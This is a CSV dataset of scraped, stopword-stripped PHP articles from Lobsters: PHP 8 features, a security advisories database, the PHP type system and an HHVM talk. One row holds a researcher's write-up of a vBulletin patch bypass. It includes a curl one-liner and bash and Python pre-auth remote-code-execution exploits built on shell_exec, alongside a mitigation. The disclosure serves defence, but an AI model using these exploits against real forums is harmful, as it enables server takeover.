ID,Source,Tag_Code,Tag_Name,Title,Url,ProcessdedTitle,WeightedContent,Content
1,Lobsters,php,PHP programming,"PHP, Seriously! (2014)",https://www.infoq.com/presentations/php-facebook/,php seriously,infoq homepage presentation php seriously summary bio conference related sponsored content,infoq homepage presentation php seriously php seriously summary keith adam examines strength made php dominant language niche highlighting facebook attempt remedying inconsistency misfeatures maintaining strength bio keith adam virtual machinist facebook one initial designer implementers hhvm open source php jit run facebook frontend series mostly fortunate event keith became founding member icantbelieveimaphpadvocate club working facebook keith worked vmware virtual machine monitor conference splash home oopsla onward dl oopsla forum many important software development last decade crc card clos design pattern agile soa wikis uml tdd refactoring java aspect onward programming software process method language community application dl address dynamic language implementation application recorded feb related sponsored content
2,Lobsters,php,PHP programming,What's new in PHP 8,https://stitcher.io/blog/new-in-php-8,new php,new php november jit compiler union type attribute new feature union type rfc benchmark nullsafe operator rfc null coalescing operator named argument rfc named argument post attribute rfc attribute another rfc attribute depth undecided match expression rfc dedicated post new return type rfc new type rfc throw expression rfc inheritance private method rfc weak map rfc weakrefs rfc allowing object rfc noncapturing catch rfc trailing comma parameter list rfc separate rfc create object interface new interface rfc new function rfc new function rfc new function pr new function rfc new function pr abstract method trait improvement rfc object implementation rfc variable syntax tweak rfc type annotation internal function external pitched always available rfc breaking change upgrading consistent type error rfc reclassified engine warning rfc operator longer silence fatal error default error reporting level default pdo error mode rfc concatenation precedence rfc stricter type check arithmetic bitwise operator rfc namespaced name single token rfc saner numeric string rfc saner string number comparison rfc reflection method signature change stable sorting rfc fatal error incompatible method signature rfc deprecation change newsletter twitter pr,new php php released november new major version mean introduce breaking change well lot new feature performance improvement right php feature freeze meaning new feature added anymore breaking change higher chance need make change code get running php kept date latest release though upgrade nt hard since breaking change deprecated version nt worry deprecation listed post besides breaking change php also brings nice set new feature jit compiler union type attribute new feature union type rfc given dynamically typed nature php lot case union type useful union type collection two type indicate either one used public function foo foobar input intfloat note void never part union type since indicates return value furthermore nullable union written using null using existing notation public function foo foonull foo void public function bar bar bar void jit time compiler promise significant performance improvement albeit always within context web request done benchmark reallife web application seems like jit nt make much difference kind php project want know jit php read another post wrote nullsafe operator rfc familiar null coalescing operator already familiar shortcoming nt work method call instead need intermediate check rely optional helper provided framework startdate booking getstartdate dateasstring startdate startdate asdatetimestring null addition nullsafe operator null coalescinglike behaviour method dateasstring booking getstartdate asdatetimestring named argument rfc named argument allow pas value function specifying value name nt take order consideration also skip optional parameter function foo string string b string c null string null foo b value b value value read indepth post attribute rfc attribute commonly known annotation language offer way add meta data class without parse docblocks quick look example attribute look like rfc use appattributesexampleattribute exampleattribute class foo exampleattribute public const foo foo exampleattribute public x exampleattribute public function foo exampleattribute bar attribute class exampleattribute public value public function construct value value value note base attribute used called phpattribute original rfc changed another rfc afterwards want take deep dive attribute work build read attribute depth blog also note attribute syntax still change still undecided match expression rfc could call big brother switch expresion match return value nt require break statement combine condition us strict type comparison nt type coercion look like result match input hello world read match expression detail rfc add syntactic sugar create value object data transfer object instead specifying class property constructor php combine one instead class money public currency currency public int amount public function construct currency currency int amount currency currency amount amount class money public function construct public currency currency public int amount lot tell property promotion read dedicated post new static return type rfc already possible return self static nt valid return type php given php dynamically typed nature feature useful many developer class foo public function test static return new static new mixed type rfc might call necessary evil mixed type cause many mixed feeling good argument make though missing type mean lot thing php function return nothing null expecting one several type expecting type ca nt type hinted php reason good thing mixed type added mixed mean one type array bool callable int float null object resource string note mixed also used parameter property type return type also note since mixed already includes null allowed make nullable following trigger error function bar mixed throw expression rfc rfc change throw statement expression make possible throw exception many new place triggererror fn throw new myerror foo bar offset throw new offsetdoesnotexist offset inheritance private method rfc previously php used apply inheritance check public protected private method word private method follow method signature rule protected public method nt make sense since private method wo nt accessible child class rfc changed behaviour inheritance check performed private method anymore furthermore use final private function also nt make sense trigger warning warning private method final never overridden class weak map rfc built upon weakrefs rfc added php weakmap implementation added php weakmap hold reference object nt prevent object garbage collected take example orms often implement cache hold reference entity class improve performance relation entity entity object garbage collected long cache reference even cache thing referencing caching layer us weak reference map instead php garbage collect object nothing else reference anymore especially case orms manage several hundred thousand entity within request weak map offer better resource friendly way dealing object weak map look like example rfc class foo private weakmap cache public function getsomethingwithcaching object obj object return cache obj computesomethingexpensive obj allowing class object rfc small yet useful new feature possible use class object instead use getclass work way getclass foo new foo vardump foo class noncapturing catch rfc whenever wanted catch exception php store variable regardless whether used variable noncapturing catch omit variable instead try catch myspecialexception exception log error something went wrong try catch myspecialexception log error something went wrong note required always specify type allowed empty catch want catch exception error use throwable catching type trailing comma parameter list rfc already possible calling function trailing comma support still lacking parameter list allowed php meaning following public function string parametera int parameterb foo objectfoo sidenote trailing comma also supported use list closure oversight added via separate rfc create datetime object interface already create datetime object datetimeimmutable object using datetime createfromimmutable immutabledatetime way around tricky adding datetime createfrominterface datetimeimmutable createfrominterface generalised way convert datetime datetimeimmutable object datetime createfrominterface datetimeinterface datetimeimmutable createfrominterface datetimeinterface new stringable interface rfc stringable interface used type hint anything string implement tostring furthermore whenever class implement tostring automatically implement interface behind scene need manually implement class foo public function tostring string return foo function bar stringable stringable bar new foo bar abc new strcontains function rfc might say long overdue finally nt rely strpos anymore know whether string contains another string instead strpos string lot word word false strcontains string lot word word new strstartswith strendswith function rfc two one long overdue two function added core strstartswith haystack hay strendswith haystack stack new fdiv function pr new fdiv function something similar fmod intdiv function allows division instead error get inf inf nan depending case new getdebugtype function rfc getdebugtype return type variable sound like something gettype would getdebugtype return useful output array string anonymous class object example calling gettype class foobar would return object using getdebugtype return class name full list difference getdebugtype gettype found rfc new getresourceid function pr resource special variable php referring external resource one example mysql connection another one file handle one resource get assigned id though previously way know id cast resource int resourceid int resource php add getresourceid function making operation obvious typesafe resourceid getresourceid resource abstract method trait improvement rfc trait specify abstract method must implemented class using caveat though php signature method implementation nt validated following valid trait test abstract public function test int input int class usestrait use test public function test input return input php perform proper method signature validation using trait implementing abstract method mean need write instead class usestrait use test public function test int input int return input object implementation tokengetall rfc tokengetall function return array value rfc add phptoken class phptoken getall method implementation work object instead plain value consumes le memory easier read variable syntax tweak rfc rfc uniform variable syntax rfc resolved number inconsistency php variable syntax rfc intends address small handful case overlooked type annotation internal function external lot people pitched add proper type annotation internal function long standing issue finally solvable change made php previous version mean internal function method complete type information reflection extjson always available rfc previously possible compile php without json extension enabled possible anymore since json widely used best developer always rely instead ensure extension exist first breaking change mentioned major update thus breaking change best thing take look full list breaking change upgrading document many breaking change deprecated previous version though staying uptodate year nt hard upgrade php consistent type error rfc userdefined function php already throw typeerror internal function rather emitted warning returned null php behaviour internal function made consistent reclassified engine warning rfc lot error previously triggered warning notice converted proper error following warning changed undefined variable error exception instead notice undefined array index warning instead notice division zero divisionbyzeroerror exception instead warning attempt incrementdecrement property nonobject error exception instead warning attempt modify property nonobject error exception instead warning attempt assign property nonobject error exception instead warning creating default object empty value error exception instead warning trying get property nonobject warning instead notice undefined property warning instead notice add element array next element already occupied error exception instead warning unset offset nonarray variable error exception instead warning use scalar value array error exception instead warning array traversables unpacked typeerror exception instead warning invalid argument supplied foreach typeerror exception instead warning illegal offset type typeerror exception instead warning illegal offset type isset empty typeerror exception instead warning illegal offset type unset typeerror exception instead warning array string conversion warning instead notice resource id used offset casting integer warning instead notice string offset cast occurred warning instead notice uninitialized string offset warning instead notice assign empty string string offset error exception instead warning supplied resource valid stream resource typeerror exception instead warning operator longer silence fatal error possible change might reveal error hidden php make sure set displayerrorsoff production server default error reporting level eall instead everything enotice edeprecated mean many error might pop previously silently ignored though probably already existent php default pdo error mode rfc rfc current default error mode pdo silent mean sql error occurs error warning may emitted exception thrown unless developer implement explicit error handling rfc change default error change pdo errmodeexception php concatenation precedence rfc already deprecated php change taken effect write something like echo sum b php would previously interpret like echo sum b php make interpreted like echo sum b stricter type check arithmetic bitwise operator rfc php possible apply arithmetic bitwise operator array resource object nt possible anymore throw typeerror object namespaced name single token rfc php used interpret part namespace separated backslash sequence token rfc changed behaviour meaning reserved name used namespaces saner numeric string rfc php type system try lot smart thing encounter number string rfc make behaviour consistent clear saner string number comparison rfc rfc fix strange case php foo result true edge case like one rfc fix reflection method signature change three method signature reflection class changed reflectionclass newinstance args reflectionfunction invoke args reflectionmethod invoke object args become reflectionclass newinstance args reflectionfunction invoke args reflectionmethod invoke object args upgrading guide specifies extend class still want support php php following signature allowed reflectionclass newinstance arg null args reflectionfunction invoke arg null args reflectionmethod invoke object arg null args stable sorting rfc php sorting algorithm unstable mean order equal element nt guaranteed php change behaviour sorting function stable sorting fatal error incompatible method signature rfc rfc inheritance error due incompatible method signature currently either throw fatal error warning depending cause error inheritance hierarchy deprecation change php development several deprecation added finalised php would like stay date new content feel free subscribe newsletter follow twitter noticed tpyo submit pr fix
3,Lobsters,php,PHP programming,PHP Security Advisories Database,https://github.com/FriendsOfPHP/security-advisories/,php security advisory database,php security advisory database must license checking vulnerability symfony cli http securitysymfonycom php cli tool tip github action contributing must merge,php security advisory database php security advisory database reference known security vulnerability various php project library database must serve primary source information security issue authoritative referenced software allows centralize information convenience easy consumption license php security advisory database free unencumbered software released public domain checking vulnerability several possibility check vulnerability application beside manual check recommended use symfony cli php dependency thirdparty api call check done locally clone repository symfony security check pathtocomposerlock upload composerlock file http securitysymfonycom use php cli tool php checker security check pathtocomposerlock tip using github use php security checker github action automatically check vulnerability pushing code contributing contributing security advisory easy get contribute new entry sending pull request creating file directly via github interface create directory based composer name software security issue exists use symfonyhttpfoundation issue symfony httpfoundation component instance security issue must saved file name cve identifier preferred date security issue announced followed increment instance file yaml format must contain following entry look existing entry example title text describes security issue word link link official security issue announcement http link preferred http one reference unique reference identify software supported scheme composer followed composer identifier branch hash affected branch name branch name like value hash following entry time date time utc security issue fixed null issue fixed yet time date merge commit fixed issue following format information must accurate possible used determine project affected version array constraint describing affected version branch format one used composer cve identifier add cve key make sure file validates running php validatorphp root project script need dependency installed via composer need run composer install affected code available different composer entry like readonly subtree split main repository duplicate information several file
4,Lobsters,php,PHP programming,Exploiting vBulletin: “A Tale of a Patch Fail”,https://blog.exploitee.rs/2020/exploiting-vbulletin-a-tale-of-patch-fail/,exploiting vbulletin tale patch fail,zenofex uncategorized comment undisclosed researcher released bug allowed php remote code execution vbulletin popular vulnerability broker cv score problem ahead bypassing two characteristic widgettabbedcontainertabpanel template allow u effectively bypass filtering previously done prevent exploited poc full exploit bash exploit python exploit metasploit module found slide exploiting vbulletin tale patch fail short term fix,posted august author zenofex filed uncategorized comment september undisclosed researcher released bug allowed php remote code execution vbulletin bug labeled bugdoor simplicity popular vulnerability broker marked cv score giving critical rating today going talk patch supplied vulnerability inadequate blocking exploitation show bypass resulting fix releasing bash oneliner resulting remote code execution latest vbulletin software vulnerability mentioned later formally labeled patch issued september although patch provided day patch seemed time fix proof concept exploit provided unnamed finder patch consisted three main change provided set patch first shown remove problematic value template variable array rendering nt pas value array potentially large nt want make unnecesary copy alternative pas reference cause headache internal function relevant array class variable private function cleanregistered disallowednames array widgetconfig foreach disallowednames name unset registered name unset self globalregistered name remove problematic value template variable array rendering nt pas value array potentially large nt want make unnecesary copy alternative pas reference cause headache internal function relevant array class variable private function cleanregistered disallowednames array widgetconfig foreach disallowednames name unset registered name unset self globalregistered name function added unfortunately obtained code opposed directly diff two coded base vbulletin provide older insecure version software patch released therefore code pulled directly patch level cleanregistered function added first fix vulnerability simply iterates list nonallowed registered variable deleting content found list added contained name single variable contained php code execute released exploit next version software vbulletin following piece added prevent future problem widgetrendering template code diff ur throw new ajax render array invalidrequest router new router setrouteinfo array action actionrender argument serverdata template routeinfo use get appears fine since setting route query params sending data template render queryparameters get apiinterfaceabstract setlight templatename routeinfo templatename widgetphp result array template csslinks array else router new router setrouteinfo array action actionrender argument serverdata template templatename use get appears fine since setting route query params sending data template render queryparameters get apiinterfaceabstract setlight result staticrenderajax templatename serverdata sendasjson staticrenderajax routeinfo serverdata sendasjson result diff ur throw new ajax render array invalidrequest router new router setrouteinfo array action actionrender argument serverdata template routeinfo use get appears fine since setting route query params sending data template render queryparameters get apiinterfaceabstract setlight templatename routeinfo templatename widgetphp result array template csslinks array else router new router setrouteinfo array action actionrender argument serverdata template templatename use get appears fine since setting route query params sending data template render queryparameters get apiinterfaceabstract setlight result staticrenderajax templatename serverdata sendasjson staticrenderajax routeinfo serverdata sendasjson result portion patch created statement would return empty template cs data widgetphp template listed last portion route two change prevented poc functioning released state third change found second part vbulletin update diff diff ur class intended allow runtime know template rendering ugly nt used lightly making feature widely available template uglier private static template array public static function starttemplate template arraypush self template template public static function endtemplate arraypop self template private static function currenttemplate return end self template public static unit array px return div style solid red htmlspecialchars timername elapsed div public static function evalphp code allow php widget template prevents malicious user hacking something different template self currenttemplate widgetphp return obstart eval code output obgetcontents obendclean return output diff ur class intended allow runtime know template rendering ugly nt used lightly making feature widely available template uglier private static template array public static function starttemplate template arraypush self template template public static function endtemplate arraypop self template private static function currenttemplate return end self template public static unit array px return div style solid red htmlspecialchars timername elapsed div public static function evalphp code allow php widget template prevents malicious user hacking something different template self currenttemplate widgetphp return obstart eval code output obgetcontents obendclean return output portion added layer redundancy attempt prevent non widgetphp template loading eval code based comment code attempt prevent user modifying template incorrectly call evalphp without embedded php widget problem ahead problem arises vbulletin template system structured specifically template actually written php instead written language first processed template engine output string php code later ran eval rendering process template also standalone item nested within template one template number child template embedded within example take following template template name widgetphp templatetype template date username vbulletin version alpha cdata vb condition empty widgetconfig empty widgetinstanceid vb data widgetconfig widget fetchconfig vb raw widgetinstanceid vb vb condition empty widgetconfig vb set widgetid vb raw widgetconfigwidgetid vb set widgetinstanceid vb raw widgetconfigwidgetinstanceid vb div class bmodule vb var widgetconfigshowatbreakpointscssclasses canvaswidget defaultwidget customhtmlwidget id widget vb raw widgetinstanceid datawidgetid vb raw widgetid datawidgetinstanceid vb raw widgetinstanceid vb template moduletitle widgetconfig vb raw widgetconfig canusesitebuilder vb raw usercanusesitebuilder div class widgetcontent vb condition empty widgetconfig code vboptions disablephprendering vb comment eval anything widgetconfig code anything else could potentially come malicious user use phpeval outside template ever vb comment vb phpeval vb raw widgetconfigcode vb else vb condition user canusesitebuilder span class note vb phrase clickedittoconfigmodule span vb vb div div template template name widgetphp templatetype template date username vbulletin version alpha cdata vb condition empty widgetconfig empty widgetinstanceid vb data widgetconfig widget fetchconfig vb raw widgetinstanceid vb vb condition empty widgetconfig vb set widgetid vb raw widgetconfigwidgetid vb set widgetinstanceid vb raw widgetconfigwidgetinstanceid vb div class bmodule vb var widgetconfigshowatbreakpointscssclasses canvaswidget defaultwidget customhtmlwidget id widget vb raw widgetinstanceid datawidgetid vb raw widgetid datawidgetinstanceid vb raw widgetinstanceid vb template moduletitle widgetconfig vb raw widgetconfig canusesitebuilder vb raw usercanusesitebuilder div class widgetcontent vb condition empty widgetconfig code vboptions disablephprendering vb comment eval anything widgetconfig code anything else could potentially come malicious user use phpeval outside template ever vb comment vb phpeval vb raw widgetconfigcode vb else vb condition user canusesitebuilder span class note vb phrase clickedittoconfigmodule span vb vb div div template template would rendered following php code finalrendered empty widgetconfig empty widgetinstanceid finalrendered rnt widgetconfig parsedata widget fetchconfig widgetinstanceid finalrendered rn ntttt else finalrendered finalrendered rnrn empty widgetconfig finalrendered rnt widgetid widgetconfig widgetid finalrendered rnt widgetinstanceid widgetconfig widgetinstanceid finalrendered rn ntttt else finalrendered finalrendered rnrn div class bmodule vbvar widgetconfig showatbreakpointscssclasses canvaswidget defaultwidget customhtmlwidget id widget widgetinstanceid datawidgetid widgetid datawidgetinstanceid widgetinstanceid rnrnt includetemplate moduletitle array widgetconfig widgetconfig showtitledivider canusesitebuilder user canusesitebuilder rnrnt div class widgetcontent rntt empty widgetconfig code vb getdatastore getoption disablephprendering finalrendered rnttt rnttt evalphp widgetconfig code rntt else finalrendered rnttt user canusesitebuilder finalrendered rntttt span class note parsephrase clickedittoconfigmodule span rnttt else finalrendered finalrendered rntt finalrendered rnt div rn div finalrendered empty widgetconfig empty widgetinstanceid finalrendered rnt widgetconfig parsedata widget fetchconfig widgetinstanceid finalrendered rn ntttt else finalrendered finalrendered rnrn empty widgetconfig finalrendered rnt widgetid widgetconfig widgetid finalrendered rnt widgetinstanceid widgetconfig widgetinstanceid finalrendered rn ntttt else finalrendered finalrendered rnrn div class bmodule vbvar widgetconfig showatbreakpointscssclasses canvaswidget defaultwidget customhtmlwidget id widget widgetinstanceid datawidgetid widgetid datawidgetinstanceid widgetinstanceid rnrnt includetemplate moduletitle array widgetconfig widgetconfig showtitledivider canusesitebuilder user canusesitebuilder rnrnt div class widgetcontent rntt empty widgetconfig code vb getdatastore getoption disablephprendering finalrendered rnttt rnttt evalphp widgetconfig code rntt else finalrendered rnttt user canusesitebuilder finalrendered rntttt span class note parsephrase clickedittoconfigmodule span rnttt else finalrendered finalrendered rntt finalrendered rnt div rn div rendered code later pushed eval process portion child template loaded also ran eval type system may seem innocuous untrained eye approach open number issue beyond insecure us eval call regardless way fail nonfiltered modification output variable open code another code executionconstant filtering required template code situation create nonescaped phpxss filtering nightmaresincluded child code access parent declared variable think many situation would optimal approach however keep analysis point focus issue leading bypass bypassing patch code mentioned one previous section may seem thorough approach actually somewhat short sighted specifically patch face issue encountering user controlled child template parent template checked verify routestring end widgetphp route however still prevented providing payload within widgetconfig value code within rendering process clean widgetconfig value prior template execution problem remedied u lucky solution manifesting following template template name widgettabbedcontainertabpanel templatetype template date username vbulletin version alpha cdata vb set panelid vb concat vb var idprefix vb var tabnum div id vb var panelid class hclearfix jsshowontabscreate hhide vb comment vb var panelid vb subwidgets value subwidget nbsp nbsp vb raw subwidgettemplate vb vb comment vb subwidgets value subwidget vb template vb raw subwidgettemplate widgetconfig vb raw subwidgetconfig widgetinstanceid vb raw subwidgetwidgetinstanceid widgettitle vb raw subwidgettitle tabbedcontainersubmodules vb raw subwidgettabbedcontainersubmodules product vb raw subwidgetproduct vb div template template name widgettabbedcontainertabpanel templatetype template date username vbulletin version alpha cdata vb set panelid vb concat vb var idprefix vb var tabnum div id vb var panelid class hclearfix jsshowontabscreate hhide vb comment vb var panelid vb subwidgets value subwidget nbsp nbsp vb raw subwidgettemplate vb vb comment vb subwidgets value subwidget vb template vb raw subwidgettemplate widgetconfig vb raw subwidgetconfig widgetinstanceid vb raw subwidgetwidgetinstanceid widgettitle vb raw subwidgettitle tabbedcontainersubmodules vb raw subwidgettabbedcontainersubmodules product vb raw subwidgetproduct vb div template template widgettabbedcontainertabpanel displayed perfect assistant bypassing previous patch two key feature template ability load user controlled child templatethe template load child template taking value separately named value placing variable named widgetconfig two characteristic widgettabbedcontainertabpanel template allow u effectively bypass filtering previously done prevent exploited poc vulnerability simplicity creating one line command line exploit simple following curl http examplecomajaxrenderwidgettabbedcontainertabpanel subwidgets template widgetphp subwidgets config code phpinfo curl http examplecomajaxrenderwidgettabbedcontainertabpanel subwidgets template widgetphp subwidgets config code phpinfo full exploit list full exploit payload written multiple different language including bash python ruby bash exploit binbash vbulletin widgettabbedcontainertabpanel zenofex br usage exploit site shellcommand br urlencode cmd cmd echo muri escape ne chomp print uriescape n send request curl subwidgets template widgetphp subwidgets config code echo cmd exit binbash vbulletin widgettabbedcontainertabpanel zenofex br usage exploit site shellcommand br urlencode cmd cmd echo muri escape ne chomp print uriescape n send request curl subwidgets template widgetphp subwidgets config code echo cmd exit python exploit usrbinenv vbulletin preauth widgettabbedcontainer rce exploit zenofex import argparse import request import sys def runexploit vbloc shellcmd postdata subwidgets template widgetphp subwidgets config code echo shellexec exit shellcmd r requestspost sajaxrenderwidgettabbedcontainertabpanel vbloc postdata return rtext ap argparseargumentparser descriptionvbulletin ajax widget template rce apaddargument l location requiredtrue helpweb address root install args apparseargs true try cmd input print runexploit argslocation cmd except keyboardinterrupt sysexit nclosing shell except exception e sysexit str e usrbinenv vbulletin preauth widgettabbedcontainer rce exploit zenofex import argparse import request import sys def runexploit vbloc shellcmd postdata subwidgets template widgetphp subwidgets config code echo shellexec exit shellcmd r requestspost sajaxrenderwidgettabbedcontainertabpanel vbloc postdata return rtext ap argparseargumentparser descriptionvbulletin ajax widget template rce apaddargument l location requiredtrue helpweb address root install args apparseargs true try cmd input print runexploit argslocation cmd except keyboardinterrupt sysexit nclosing shell except exception e sysexit str e metasploit module also process pushing public metasploit module metasploitframework project pull request found slide also published slide exploiting vbulletin tale patch fail short term fix fix disable php widget within forum may break functionality keep safe attack patch released vbulletin go vbulletin administrator control panelclick setting menu left option dropdownchoose general setting click edit setting look disable php static html ad module rendering set yes click save godspeed happy defcon safe mode
5,Lobsters,php,PHP programming,Everything you need (and don't need) to know about PHP's type system,https://thephp.website/en/issue/php-type-system/,everything need nt need know php type system,everything need nt need know php type system leia em português php dynamically typed scripting language scalar type declaration return type declaration type hinting analyzed statically still support dynamic type type mismatch reach twitter aahh like kind content certainly enjoy post time compiler work open another tab check later wo nt regret kind type php gettype vardump scalar type compound type special type scalar type main takeaway scalar value behaviour state represent value compound type one four compound type carry different syntactic capability array compound type key value feel free ping like hear specific function manipulate internal pointer main takeaway array extremely flexible compound type perceived hashmap also considered iterable type object compound type main takeaway object normally lower memory profile array carry state behaviour created casting array callable compound type calluserfunc call private protected method inside class scope invoke magic method main takeaway callables hold reference function method constructed different way iterable compound type traversable interface foreach loop yield statement spread operator main takeaway fit foreach iterable special type ca nt cast type resource null resource represents handle external resource null type represents null value main takeaway special typed value ca nt casted anything class instance gettype vardump getclass type operation php type juggling type casting coercion type conversion type cast manually explicitly type coercion implicitly type casting meaning cast scalar compound type php casting object scalar type completely valid also possible cast value type main takeaway php allows cast scalar type array object class casting allowed type coercion type coercion happens sideeffect working mismatched undeclared type main takeaway php mechanism normalize type runtime implicitly always watch type hinting since php also possible typehint class property function body always trust integer expected integer depend function caller nt mean php statically typed strict type switched main takeaway type hinting give mere hint type engine order strict typing choice bring small overhead union type pseudotype exists readability purpose nullable type php come proper union type feature php type juggling php support explicit type definition variable declaration snippet php source code may return integer float simply take granted type juggling happen automatically boolean conversion return false original value return true everything else converting boolean section manual also found language manual important note using stricttypes union type follow rule php type mode already realized two way php handle type coercive type mode strict type mode juggling guessing still happens explicitly defined type set typeerrors thrown type mismatch happen strlen logic php source code main takeaway strict type wo nt make code faster closing thought main takeaway took incredible amount time write article like show kind support please share social medium social circle,everything need nt need know php type system leia em português php dynamically typed scripting language year php support statically declared type one could cast scalar type explicitly code declaring scalar type method function signature nt thing php scalar type declaration return type declaration rfcs nt mean version php became statically typed language though type hinting analyzed statically still support dynamic type even allows mixed see example php function returnsint int return doubt type mismatch return type supposed int returned type fact string php automatically transform token integer order return required type even though seems extra cost nt php type juggling nearly costfree many case better clarify language deal type split article following section suggestion add feel free reach twitter opening issue github aahh like kind content certainly enjoy post time compiler work open another tab check later wo nt regret kind type php php type system simplified come language feature example char type unsigned type even char type simplified string type integer variation simplified integer type whether good bad thing one always inspect variable type using gettype function using vardump function checking output php come three different kind type scalar type compound type special type scalar type scalar type bare bone language four boolean bool boolean integer int integer float float double string string definition scalar type carry behaviour state expression like tostring thephpwebsite length invalid main takeaway scalar value behaviour state represent value compound type compound type much interesting even though similar scalar type one four compound type carry different syntactic capability four compound type array compound type array fact hashmap builtin language meaning store value key value manner even use purely vector array flexible structure come size internal type keyvalue mapping example valid array php vec vec int map b map int mapish mapish int mapish int unlike c php wo nt require define array size creating course come memory consumption cost bigger array size memory consume crazy proportion fact array allocated power two consumption work scope article feel free ping like hear case curious statement video present chart insight array v object memory profile videovideo see bellow array also considered type iterable meaning iterate using foreach loop also provide specific function manipulate internal pointer main takeaway array extremely flexible compound type perceived hashmap also considered iterable type object compound type due php architecture object compound type normally much lower memory consumption profile compared array normally one would use object type creating instance class object carry state behaviour meaning php offer dereferencing language structs access object internals snippet illustrates php object derefs php class myclass private const public int property public function method void obj new myclass obj object myclass obj int obj property int obj method null object also normally created result type cast array transforming array key object property name cast always result object stdclass type php obj object obj object stdclass obj int important notice casting array numeric key object valid one ca nt dereference value property name may start number php obj object legal obj illegal main takeaway object normally lower memory profile array carry state behaviour created casting array callable compound type callable php anything called oh nt say parenthesis calluserfunc function word callable fulfil responsibility know function function method always callables object class may also become callables callable definition reference stored variable like following php callable strlen string well yes coerced callable necessary like php function callacallable callable f int return f thephpwebsite callable strlen vardump callable thephpwebsite int vardump callacallable callable int callables may also point object method php class myclass public function mymethod int return obj new myclass vardump obj mymethod int look odd know look like array fact unless name callable kind callable objectmethod reference interesting call private protected method inside class scope otherwise may call public method also class implement invoke magic method automatically transform instance callables like following php class mycallableclass public function invoke int return obj new mycallableclass vardump obj int main takeaway callables hold reference function method constructed different way iterable compound type iterables simpler explain definition array instance traversable interface main thing iterable used foreach loop yield statement spread operator example iterables php function generatorfunction generator variable iterables b generatorfunction c new arrayobject main takeaway fit foreach iterable special type two special type biggest reason called special ca nt cast type special type resource type null type resource represents handle external resource file handle io stream database connection handle may guess ca nt convert resource type null type represents null value meaning variable holding null initialized assigned null unset runtime main takeaway special typed value ca nt casted anything class instance class instance type object always presented like executing gettype object always return string object calling vardump object always print value using object classname notation need fetch object class string use getclass function php obj new stdclass echo gettype obj object vardump obj object stdclass echo getclass obj stdclass type operation php different operation one php come type believe important clearly state nt mix thing later type juggling type casting coercion dive three important definition need keep mind type conversion mean transform type b example integer float type cast mean manually explicitly convert type b hundred int float became int type coercion mean implicitly convert type b twenty banana string banana became int said following section explain happens php later find information type juggling type casting similar java php allows type casting meaning variable point value casted different type allows manual explicit type conversion wait wait given variable hundred holding string value may manually converted casted become int float scalar type one compound type array object following snippet work fine php similar java php hundred int hundred int one thing java completely illegal php code convert cast variable pointer different class meaning cast scalar compound type php php class myclass yield parse error illegal myclass new stdclass important notice type casting php allowed scalar type meaning casting object different class instance illegal casting object scalar type completely valid also possible cast value array object type nt considered scalar type compound type naming really tough huh php class myclass obj new myclass one int obj int code generates notice still valid later explain int value came main takeaway php allows cast scalar type array object class casting allowed type coercion type coercion happens sideeffect working mismatched undeclared type explained depth later article know php automatically cast type code runtime necessary example type coercion multiplying integer float number expression int multiplied float result float value php vardump float main takeaway php mechanism normalize type runtime implicitly always watch type hinting type hinting coercion enforcement strict typing mechanism introduced php language version affect function method signature since php also possible typehint class property example type hint php function sum int int b int return b hint say variable naturally coerced type int variable b naturally coerced type int result function naturally coerced type int notice used naturally coerced php wo nt complain call function noninteger value fact attempt implicitly convert coerce parameter integer nt already function body always trust b integer expected integer depend function caller php function sum int int b int int b int return b sum apple banana also possible use php directive named stricttypes avoid coercion simply raise error type mismatch occurs like following php declare function sum int int b int return b sum banana apple php fatal error uncaught typeerror argument passed sum must type int string given nt mean php statically typed strict type switched fact type hinting add processing overhead php engine internally always perform type juggling wo nt ever trust variable type hint type hint serve two purpose define type value coerced raise fatal error strict type switched main takeaway type hinting give mere hint type engine order strict typing choice bring small overhead union type move type juggling like quickly talk union type seems make sense besides three type php scalar compound special php manual also mention pseudotype exists readability purpose type nt really exist convention want pay attention one specific pseudotype arrayobject pseudotype often used documentation specify parameter return type iterable type also kindof union type defined arraytraversable since php language added kindof support union type introducing nullable type really think nullable type union tnull example int mean intnull bet never thought many unknown union type php come proper union type feature define union need without depend pseudotypes convention work like php declare function divide int int b intfloat return b function may return integer float never anything else php type juggling probably nt first time heard term type juggling one important core feature php offer yet one least understood one ca nt blame people knowing called juggling reason many variation variable type context become quite cumbersome understand type dealing let start following statement php support explicit type definition variable declaration powerful whenever declare variable php infer type contain based assignment var creates variable null value one creates integer obj new stdclass creates object stdclass type definition php try best guess type attributed variable php variable dynamic point may change type runtime without trouble code valid php var var null var var int var thephpwebsite var string thephpwebsite var new stdclass var object stdclass variable dynamic many operation php require engine check value based operation context expression like sum b internally check first operand type later guess second operand type take look snippet php source code long integer check long b integer perform long sum otherwise check double perform double sum yes expression may return integer float simply take granted type juggling happen automatically also mean type coercion implicit cast also happen automatically nt supposed surprise specific moment type coercion may occur type coercion therefore juggling may occur resolving expression passing argument function method returning function method might thinking well coercion everywhere php handle incompatible type converting integer boolean seems ok array integer sound bit awkward already well php well defined rule type casting first thing necessary understand resulting type supposed later evaluate casting example expression occurs inside statement quickly realize expression yield boolean value php var var int var treated bool evaluates true var var still int var still int notice var int entire lifetime got treated bool true inside statement statement expects expression evaluates boolean result type juggling exactly php hood illustrate go decision tree converting type boolean boolean conversion return false original value bool false int int float float empty string zero string empty array null simplexml instance created empty tag return true everything else table found converting boolean section manual complete documentation type comparison conversion table also found language manual nt courage read part job make available important note php union type introduced language bringing extra layer complexity type juggling dealing union type must follow precedence precedence welldefined instead based type order using stricttypes union type follow rule union type nt contain subject type may coerce value following order precedence int float string bool example php function f intstring v void vardump v f string union type string f int union type f float nt union type int f array nt union type uncaught typeerror f argument v must type stringint example something interesting happens array type wo nt converted bool false raise typeerror instead php type mode already realized two way php handle type one way called coercive type mode juggling guessing game happening way strict type mode juggling guessing still happens explicitly defined type set typeerrors thrown type mismatch happen see common thing php developer expect engine respect law equivalent exchange 等価交換法 pay effort strictly typing everything performance boost finally able bypass type check perform operation right away see reason someone might think way must tell completely wrong let check following strlen logic php source code every time need check whether using strict mode get boolean value exusesstricttypes true strict mode false coercive mode check snippet start like zval value value bpvarr value parameter strlen expected ztypep value isstring zvallong exvar opline resultvar zstrlenp value zendvmnextopcode else see first statement guess exactly check parameter type know snippet type hint nothing else clause hold interesting stuff might use strict type else look promising zendbool strict isvariscv ztypep value isreference strict exusesstricttypes expected strict zendinternaltypeerror strict zvalnull exvar opline resultvar snippet see example strict mode nt cut processing fact creates couple extra check single purpose raise fatal error saying bad implementation personally happy think important make clear wo nt affect performance positively main takeaway strict type wo nt make code faster closing thought article big quest seriously thinking writing book page alone would make goodsized book already hope information collected useful least interesting believe php type system incredibly 